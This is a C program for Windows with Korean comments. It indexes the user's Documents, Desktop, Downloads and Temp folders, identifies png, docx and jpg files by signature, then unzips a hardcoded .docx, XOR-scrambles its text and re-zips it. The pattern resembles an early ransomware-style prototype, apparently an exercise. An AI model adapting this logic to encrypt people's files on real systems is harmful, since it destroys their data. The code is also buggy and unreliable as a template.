#define _CRT_SECURE_NO_WARNINGS
#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <stdlib.h>
#include <windows.h>
#include "minizip/unzip.h"
#include "zip.h"

#include <sys/stat.h>
#include <direct.h>

#define MAX_LEN 512

void create_directory(const char* dir) {
#ifdef _WIN32
    _mkdir(dir);
#else
    mkdir(dir, 0777);
#endif
}


// 경로별 구조체 생성
struct directory_document {
    char* file_name;   // 파일명
    char* file_type;   // 파일인지, 디렉터리인지
    char* file_signature; // 파일 시그니처값
    int count;         // 파일 및 디렉토리 수
};

struct directory_document* document_dir;
struct directory_document* desktop_dir;
struct directory_document* downloads_dir;
struct directory_document* temp_dir;

void directory_indexing(char* directory_list[], int directory_list_len) {
    for (int i = 0; i < directory_list_len; i++) {
        int file_count = 0;
        WIN32_FIND_DATAA data;
        printf("\nFind %s Directory: \n", directory_list[i]);

        HANDLE hFind = FindFirstFileA(directory_list[i], &data);

        struct directory_document** target_dir = NULL;

        switch (i) {
        case 0:
            target_dir = &document_dir;
            break;
        case 1:
            target_dir = &desktop_dir;
            break;
        case 2:
            target_dir = &downloads_dir;
            break;
        case 3:
            target_dir = &temp_dir;
            break;
        }

        *target_dir = malloc(sizeof(struct directory_document));

        do {
            if (!(data.dwFileAttributes & FILE_ATTRIBUTE_SYSTEM) && strcmp(data.cFileName, "..") != 0 && strcmp(data.cFileName, ".") != 0) {
                file_count++;

                *target_dir = realloc(*target_dir, sizeof(struct directory_document) * file_count);

                (*target_dir)[file_count - 1].file_name = _strdup(data.cFileName);
                (*target_dir)[file_count - 1].file_type = (data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) ? "Directory" : "File";
                (*target_dir)[file_count - 1].file_signature = "unknown";

                //printf("%s: %s\n", (*target_dir)[file_count - 1].file_type, (*target_dir)[file_count - 1].file_name);
            }
        } while (FindNextFileA(hFind, &data));

        FindClose(hFind);

        printf("file count: %d\n\n", file_count);

        (*target_dir)[0].count = file_count;
    }

    return;
}

void print_directory_contents(struct directory_document* dir) {
    for (int i = 0; i < dir[0].count; i++) {
        printf("File Name: %s, File Type: %s, File Signature: %s\n", dir[i].file_name, dir[i].file_type, dir[i].file_signature);
    }
    return;
}

char* file_Signatures_check(unsigned char* buffer, long file_size) {

    char* signatures_array_alias[3] = { "png","docx", "jpg" }; //구조체에 저장할 파일 시그니처 명
    unsigned char* signatures_array[3] = { (unsigned char*)"\x89\x50\x4E\x47\x0D\x0A\x1A\x0A", (unsigned char*)"\x50\x4B\x03\x04\x14\x00\x06\x00", (unsigned char*)"\xFF\xD8\xFF" }; //실제 시그니처값
    int signature_array_value_len[3] = { 8, 8, 3 }; // 시그니처값의 길이

    int signatures_array_len = sizeof(signatures_array) / sizeof(signatures_array[0]);

    //printf("signatures_list_len: %d\n", signatures_array_len);

    for (int i = 0; i < signatures_array_len; i++) {

        for (int j = 0; j < signature_array_value_len[i]; j++) {
            // printf("signatures_%d_array , %dth value: %02x\n",i, j,signatures_array[i][j]);
            // printf("file hex value: %02x\n",buffer[j]);
            // printf("j:%d\n",j);
            // printf("i:%d\n",i);
            if (signatures_array[i][j] != buffer[j]) {
                printf("not matching %s\n", signatures_array_alias[i]);
                break;
            }
            // else{
            //     printf("is matching\n");
            // }

            //여기까지 왔다는건 모두 매칭되었다는 뜻
            if (j == signature_array_value_len[i] - 1) {
                printf("Find Signature: %s\n", signatures_array_alias[i]);
                return signatures_array_alias[i];
            }

        }

    }


    printf("\n");
    return "unknown";
}

void file_binary_check(struct directory_document* dir, char* directory) {
    for (int i = 0; i < dir[0].count; i++) {
        if (dir[i].file_type == "Directory") {
            continue;
        }
        char* file_names = dir[i].file_name;

        char full_path[1024];
        snprintf(full_path, sizeof(full_path), "%s%s", directory, file_names);
        printf("\nopen file: %s\n", full_path);


        FILE* file = fopen(full_path, "rb");
        if (file == NULL) {
            printf("Could not open file %s\n", full_path);
            continue;
        }

        // 파일 크기 확인
        fseek(file, 0, SEEK_END);
        long file_size = ftell(file);
        rewind(file);

        // 메모리 할당
        unsigned char* buffer = malloc(file_size);
        if (buffer == NULL) {
            printf("Could not allocate memory for file %s\n", full_path);
            continue;
        }

        // fread
        size_t result = fread(buffer, 1, file_size, file);
        if (result != file_size) {
            printf("Reading error for file %s\n", full_path);
            continue;
        }

        //출력
        // for (int j = 0; j < file_size; j++) {
        //    printf("%02x ", buffer[j]);
        // }
        // printf("\n");

        // 구조체에 시그니처값 적용
        dir[i].file_signature = file_Signatures_check(buffer, file_size);

        // 메모리 해제
        free(buffer);
        fclose(file);


    }
    return;
}

void xorEncrypt(char* input, char key) {
    while (*input) {
        *input = *input ^ key;
        input++;
    }
}


void xor_docx(const char* dest_dir) {
    //TODO: word/document.xml 열기

    //실제 시그니처값
    char xor_target_file[200] = "";
    strcat(xor_target_file, dest_dir);
    strcat(xor_target_file, "\word\\document.xml");

    // 여기부터
    printf("\nopen document.xml file: %s\n", xor_target_file);


    FILE* file = fopen(xor_target_file, "rb+");
    if (file == NULL) {
        printf("Could not open file %s\n", xor_target_file);
        //continue;
        return;
    }

    // 파일 크기 확인
    fseek(file, 0, SEEK_END);
    long file_size = ftell(file);
    rewind(file);

    // 메모리 할당
    unsigned char* buffer = calloc(1, file_size + 1);
    buffer[file_size] = '\0';
    printf("%s\n", buffer);

    unsigned char* new_buffer = malloc(file_size);
    if (buffer == NULL) {
        printf("Could not allocate memory for file %s\n", xor_target_file);
        //continue;
        return;
    }

    // fread
    size_t result = fread(buffer, 1, file_size, file);
    if (result != file_size) {
        printf("Reading error for file %s\n", xor_target_file);
        //continue;
        return;
    }

    //출력
    //for (int j = 0; j < file_size; j++) {
    printf("%s ", buffer);
    // text_open[0]이랑 같은지 체크.
    // 같다면? text_open[1]이랑 같은지 체크
 //}
    printf("\n");

    char* startTag = "<w:t>";
    char* endTag = "</w:t>";
    char* start, * end;

    start = strstr(buffer, startTag);
    while (start) {
        start += strlen(startTag); // <w:t> 태그 이후의 위치로 이동
        end = strstr(start, endTag);
        if (end) {
            char tmp = *end; // 일시적으로 end 위치의 문자 저장
            *end = '\0'; // 문자열을 일시적으로 종료시켜서 XOR 암호화에 사용
            xorEncrypt(start, 0x01); // XOR 암호화 수행
            *end = tmp; // 원래 문자 복구
            start = strstr(end, startTag); // 다음 <w:t> 태그 위치 검색
        }
        else {
            break;
        }
    }

    printf("%s\n", buffer);
    fclose(file);

    FILE* file2 = fopen(xor_target_file, "w+");
    fprintf(file2, "%s", buffer);


    // 메모리 해제
    free(buffer);
}


void unzip_docx(const char* docx_filename, const char* dest_dir) {
    unzFile zip_file = unzOpen(docx_filename);
    if (!zip_file) {
        printf("Failed to open the DOCX file.\n");
        return -1;
    }

    create_directory(dest_dir);

    int ret = unzGoToFirstFile(zip_file);
    while (ret == UNZ_OK) {
        char filename[256];
        unz_file_info file_info;

        ret = unzGetCurrentFileInfo(zip_file, &file_info, filename, sizeof(filename), NULL, 0, NULL, 0);
        if (ret != UNZ_OK) {
            printf("Failed to get file information from the DOCX archive.\n");
            unzClose(zip_file);
            return -1;
        }

        char* dest_file_path = (char*)malloc(strlen(dest_dir) + strlen(filename) + 1);
        strcpy(dest_file_path, dest_dir);

        char* token = strtok(filename, "/");
        while (token != NULL) {
            strcat(dest_file_path, token);
            token = strtok(NULL, "/");

            if (token != NULL) {
                create_directory(dest_file_path);
                strcat(dest_file_path, "/");
            }
        }

        // printf("filename: %s\n", filename);

        if (filename[strlen(filename) - 1] == '/') {
            // 디렉터리
        }
        else {
            
            FILE* dest_file = fopen(dest_file_path, "wb");
            if (!dest_file) {
                printf("Failed to open destination file for writing.\n");
                unzClose(zip_file);
                return -1;
            }

            ret = unzOpenCurrentFile(zip_file);
            if (ret != UNZ_OK) {
                printf("Failed to open current file in the DOCX archive.\n");
                fclose(dest_file);
                unzClose(zip_file);
                return -1;
            }

            unsigned char buffer[4096];
            int read_size;
            do {
                read_size = unzReadCurrentFile(zip_file, buffer, sizeof(buffer));
                if (read_size < 0) {
                    printf("Failed to read file data from the DOCX archive.\n");
                    fclose(dest_file);
                    unzCloseCurrentFile(zip_file);
                    unzClose(zip_file);
                    return -1;
                }

                if (read_size > 0) {
                    fwrite(buffer, 1, read_size, dest_file);
                }
            } while (read_size > 0);

            fclose(dest_file);
            unzCloseCurrentFile(zip_file);
        }

        free(dest_file_path);
        ret = unzGoToNextFile(zip_file);
    }

    unzClose(zip_file);

    printf("DOCX file extraction completed successfully.\n");

    xor_docx(dest_dir);
    


    // 여기까지

    //TODO: 3C 77 3A 74 3E(<w:t>), 3C 2F 77 3A 74(</w:t>) find chcek
    // 3C 찾고, 같으면 다음 index에서 77찾고
    // 다 똑같으면 그 다음 index부터 xor
    // 중간에 달라지면 continue;
    
    return;
}


void zip_entry(zipFile zip_file, const char* base_dir, const char* sub_dir) {
    char search_path[MAX_PATH];
    sprintf(search_path, "%s\\%s\\*", base_dir, sub_dir);

    WIN32_FIND_DATA findFileData;
    HANDLE hFind = FindFirstFile(search_path, &findFileData);

    if (hFind == INVALID_HANDLE_VALUE) {
        return;
    }

    do {
        const char* filename = findFileData.cFileName;

        if (strcmp(filename, ".") != 0 && strcmp(filename, "..") != 0) {
            char fullpath[MAX_PATH];
            sprintf(fullpath, "%s\\%s\\%s", base_dir, sub_dir, filename);

            char zip_path[MAX_PATH];
            sprintf(zip_path, "%s\\%s", sub_dir, filename);

            if (findFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
                // If it's a directory, add an entry and recurse
                zip_entry(zip_file, base_dir, zip_path);
            }
            else {
                FILE* fp = fopen(fullpath, "rb");
                if (fp) {
                    fseek(fp, 0, SEEK_END);
                    long filesize = ftell(fp);
                    fseek(fp, 0, SEEK_SET);

                    void* buffer = malloc(filesize);
                    fread(buffer, 1, filesize, fp);

                    zipOpenNewFileInZip(zip_file, zip_path, NULL, NULL, 0, NULL, 0, NULL, Z_DEFLATED, Z_DEFAULT_COMPRESSION);
                    zipWriteInFileInZip(zip_file, buffer, filesize);
                    zipCloseFileInZip(zip_file);

                    free(buffer);
                    fclose(fp);
                }
            }
        }
    } while (FindNextFile(hFind, &findFileData) != 0);

    FindClose(hFind);
}

void zip_directory(const char* source_dir, const char* zip_filename) {
    zipFile zip_file = zipOpen(zip_filename, APPEND_STATUS_CREATE);
    if (!zip_file) {
        printf("ZIP 파일을 작성하는데 실패했습니다.\n");
        return;
    }

    zip_entry(zip_file, source_dir, "");

    zipClose(zip_file, NULL);
    printf("디렉터리 압축이 완료되었습니다.\n");
}

int main() {
    char* directory_list[4] = { "C:\\Users\\user\\Documents\\*", "C:\\Users\\user\\Desktop\\*", "C:\\Users\\user\\Downloads\\*", "" };

    DWORD dwsize = MAX_LEN;
    char strUserName[MAX_LEN] = { 0 };

    int nError = GetUserNameA(strUserName, &dwsize);
    if (!nError) {
        printf("GetUserNameA function is ERROR\n");
        return -1;
    }
    printf("Get Username: %s\n", strUserName);

    char temp_directory[MAX_LEN] = { 0 };
    sprintf(temp_directory, "C:\\Users\\%s\\Appdata\\Local\\Temp\\*", strUserName);
    directory_list[3] = temp_directory;

    directory_indexing(directory_list, sizeof(directory_list) / sizeof(directory_list[0]));

    printf("\nDocument Directory:\n");
    print_directory_contents(document_dir);

    printf("\nDesktop Directory:\n");
    print_directory_contents(desktop_dir);

    printf("\nDownloads Directory:\n");
    print_directory_contents(downloads_dir);

    printf("\nTemp Directory:\n");
    //print_directory_contents(temp_dir);



    file_binary_check(document_dir, "C:\\Users\\user\\Documents\\");
    printf("\nnew Document Directory:\n");
    print_directory_contents(document_dir);

    //unzip docx
    unzip_docx("C:\\Users\\user\\Documents\\example2.docx", "C:\\Users\\user\\Documents\\output2\\");
    zip_directory("C:\\Users\\user\\Documents\\output2\\", "output2.zip");




    // memory free 잊지말기.
    return 1;
}
